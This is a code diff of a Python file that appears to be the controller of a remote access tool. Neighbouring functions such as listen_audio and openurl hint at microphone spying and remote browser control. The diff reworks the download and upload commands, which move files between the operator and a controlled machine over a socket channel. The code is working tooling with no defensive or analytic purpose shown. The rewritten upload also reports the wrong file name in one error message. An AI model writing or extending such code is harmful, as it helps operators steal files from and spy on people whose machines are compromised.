@@ -136,57 +136,58 @@ def listen_audio():
         print(E+"Failed to listen!")
         return
 
-def download(input_file):
-    command = input_file
-    input_file = "".join(input_file.split("download")).strip()
-    if input_file.strip():
-        output_filename = input_file.split("/")[-1] if "/" in input_file else input_file.split("\\")[-1] if "\\" in input_file else input_file
-        unicorn.send(command.encode("UTF-8"))
-        down = unicorn.recv().decode("UTF-8", "ignore")
-        if down == "true":
-            print(G+"Downloading {}...".format(output_filename))
-            wf = open(output_filename, "wb")
-            while True:
-                data = unicorn.recv()
-                if data == b"success":
-                    break
-                elif data == b"fail":
-                    wf.close()
-                    os.remove(output_filename)
-                    print(E+"Failed to download!")
-                    return
-                wf.write(data)
-            print(G+"Saving to {}...".format(os.getcwd()+os.sep+output_filename))
-            wf.close()
-            print(S+"Saved to {}!".format(os.getcwd()+os.sep+output_filename))
-        else:
-            print(down)
+def download(command):
+    files = ("".join(command.split("download")).strip()).split(" ")
+    if len(files) < 2:
+        print("Usage: download <input_file> <output_path>")
+        return
+    input_file = files[0]
+    output_file = files[1]
+    unicorn.send("download {}".format(input_file).encode("UTF-8"))
+    down = unicorn.recv().decode("UTF-8", "ignore")
+    if down == "true":
+        print(G+"Downloading {}...".format(output_file))
+        wf = open(output_file, "wb")
+        while True:
+            data = unicorn.recv()
+            if data == b"success":
+                break
+            elif data == b"fail":
+                wf.close()
+                os.remove(output_file)
+                print(E+"Failed to download!")
+                return
+            wf.write(data)
+        print(G+"Saving to {}...".format(output_file))
+        wf.close()
+        print(S+"Saved to {}!".format(output_file))
     else:
-        pass
+        print(down)
 
 def upload(command):
-    output_file = "".join(command.split("upload")).strip()
-    if not output_file.strip():
-        pass
+    files = ("".join(command.split("upload")).strip()).split(" ")
+    if len(files) < 2:
+        print("Usage: upload <input_file> <output_path>")
+        return
+    input_file = files[0]
+    output_file = files[1]
+    if not os.path.isfile(input_file):
+        print(E+"Local file: "+output_file+": does not exist!")
     else:
-       if not os.path.isfile(output_file):
-           print(E+"Local file: "+output_file+": does not exist!")
-       else:
-           unicorn.send(command.encode("UTF-8"))
-           print(G+"Uploading {}...".format(output_file))
-           with open(output_file,"rb") as wf:
-               for data in iter(lambda: wf.read(4100), b""):
-                   try:
-                       unicorn.send(data)
-                   except(KeyboardInterrupt,EOFError):
-                       wf.close()
-                       unicorn.send("fail".encode("UTF-8"))
-                       print(E+"Failed to upload!")
-                       return
-           unicorn.send("success".encode("UTF-8"))
-           savedpath = unicorn.recv().decode("UTF-8")
-           print(G+"Saving to " + str(savedpath).strip() + "...")
-           print(S+"Saved to "+str(savedpath).strip()+"!")
+        unicorn.send("upload {}".format(output_file).encode("UTF-8"))
+        print(G+"Uploading {}...".format(input_file))
+        with open(input_file, "rb") as wf:
+            for data in iter(lambda: wf.read(4100), b""):
+                try:
+                    unicorn.send(data)
+                except(KeyboardInterrupt,EOFError):
+                    wf.close()
+                    unicorn.send("fail".encode("UTF-8"))
+                    print(E+"Failed to upload!")
+                    return
+        unicorn.send("success".encode("UTF-8"))
+        print(G+"Saving to "+output_file+"...")
+        print(S+"Saved to "+output_file+"!")
 
 def openurl(command):
     url = "".join(command.split("openurl")).strip()
